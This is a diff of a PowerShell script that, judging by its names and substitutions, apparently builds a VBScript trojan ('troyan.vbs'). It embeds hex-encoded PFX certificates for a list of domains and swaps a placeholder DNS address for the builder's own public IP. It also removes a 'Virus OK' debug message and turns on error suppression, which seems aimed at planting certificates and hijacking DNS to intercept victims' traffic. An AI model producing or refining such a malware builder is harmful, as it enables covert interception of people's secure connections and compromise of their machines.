@@ -1,37 +1,38 @@
-# Get the script directory
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
+$domainArray = Get-Content (Join-Path -Path $scriptDir -ChildPath "../domains.txt")
+$publicInterface = (Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4'}).IPAddress
 
-# Define the path to the binary file
-$binaryFilePath = Join-Path -Path $scriptDir -ChildPath '..\cert\mc.yandex.ru.pfx'
 
-# Read the binary file
-try {
-    $binaryData = Get-Content -Path $binaryFilePath -Encoding Byte -Raw
+function CreateEntry {
+    param (
+        [string]$domain
+    )
+    $pathPfx = Join-Path -Path $scriptDir -ChildPath "..\cert\$domain.pfx"
+    $binaryData = Get-Content -Path $pathPfx -Encoding Byte -Raw
+    $hexString = [BitConverter]::ToString($binaryData)
+    return $hexString
 }
-catch {
-    Write-Host "Error reading the binary file: $_"
-    exit 1
+
+
+$stringList = @()
+foreach ($domain in $domainArray) {
+    if (-not [string]::IsNullOrWhiteSpace($domain)) 
+    {
+       $code = CreateEntry -domain $domain
+       $stringList += "`"$code`""
+    }
 }
+$listString = $stringList -join ', '
 
-# Convert binary data to hexadecimal string
-$hexString = [BitConverter]::ToString($binaryData)
+$template = Get-Content (Join-Path -Path $scriptDir -ChildPath "./dns.vbs")
 
-# Create VBScript content with a variable containing the hexadecimal data
-$vbsContent = @"
-Dim binaryData
-binaryData = "$hexString"
-' Your VBScript code here using the binaryData variable
-"@
+$template = $template -replace "1\.1\.1\.1", $publicInterface
+$template  = $template -replace 'MsgBox "Virus OK"', ""
+$template  = $template -replace "' Hello Moto", "On Error Resume Next"
+$template  = $template -replace '"00","01"', $listString
 
-# Define the path for the output VBScript file
-$outputFilePath = Join-Path -Path $scriptDir -ChildPath 'outPfx.vbs'
+$troyan = Join-Path -Path $scriptDir -ChildPath './troyan.vbs'
 
-# Save the VBScript content to the output file
-try {
-    $vbsContent | Out-File -FilePath $outputFilePath -Encoding ASCII
-    Write-Host "VBScript file created successfully: $outputFilePath"
-}
-catch {
-    Write-Host "Error saving the VBScript file: $_"
-    exit 1
-}
+$template | Set-Content -Path $troyan
+
+Write-Host 'Done'
